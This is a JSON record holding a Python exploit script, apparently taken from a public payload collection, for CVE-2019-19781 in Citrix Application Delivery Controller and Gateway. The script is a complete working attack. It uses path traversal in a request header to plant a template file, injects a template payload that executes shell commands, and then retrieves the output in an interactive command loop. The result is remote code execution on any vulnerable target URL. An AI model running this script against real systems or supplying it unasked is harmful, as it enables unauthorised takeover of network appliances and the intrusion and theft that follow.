{
    "code": "#!/usr/bin/env python\n# https://github.com/mpgn/CVE-2019-19781\n# # #\n\nimport requests\nimport string\nimport random\nimport re\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nprint(\"CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway\")\nprint(\"Found by Mikhail Klyuchnikov\")\nprint(\"\")\n\nif len(sys.argv) < 2:\n  print(\"[-] No URL provided\")\n  sys.exit(0)\n\nwhile True:\n    try:\n      command = input(\"command > \")\n\n      random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))\n      print(\"[+] Adding bookmark\", random_xml + \".xml\")\n\n      burp0_url = sys.argv[1] + \"/vpn/../vpns/portal/scripts/newbm.pl\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                      random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      burp0_data = {\"url\": \"http://exemple.com\", \"title\": \"[%t=template.new({'BLOCK'='print `\" + str(command) + \"`'})%][ % t % ]\", \"desc\": \"test\", \"UI_inuse\": \"RfWeb\"}\n      r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)\n\n      if r.status_code == 200:\n        print(\"[+] Bookmark added\")\n      else:\n        print(\"\\n[-] Target not vulnerable or something went wrong\")\n        sys.exit(0)\n\n      burp0_url = sys.argv[1] + \"/vpns/portal/\" + random_xml + \".xml\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                       random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      r = requests.get(burp0_url, headers=burp0_headers,verify=False)\n\n      replaced = re.sub('^&#.*&#10;$', '', r.text, flags=re.MULTILINE)\n      print(\"[+] Result of the command: \\n\")\n      print(replaced)\n\n    except KeyboardInterrupt:\n            print(\"Exiting...\")\n            break",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/Citrix CVE-2019-19781.py",
    "license": "MIT",
    "language": "python"
}